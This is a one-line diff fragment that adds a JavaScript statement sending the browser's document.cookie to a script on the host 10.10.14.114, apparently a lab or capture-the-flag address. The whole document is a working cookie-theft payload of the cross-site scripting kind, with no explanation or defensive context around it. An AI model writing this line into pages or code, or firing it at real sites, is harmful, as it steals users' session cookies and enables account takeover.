@@ -1,0 +1,1 @@
+new Image().src='http://10.10.14.114/index.php?c='+document.cookie;
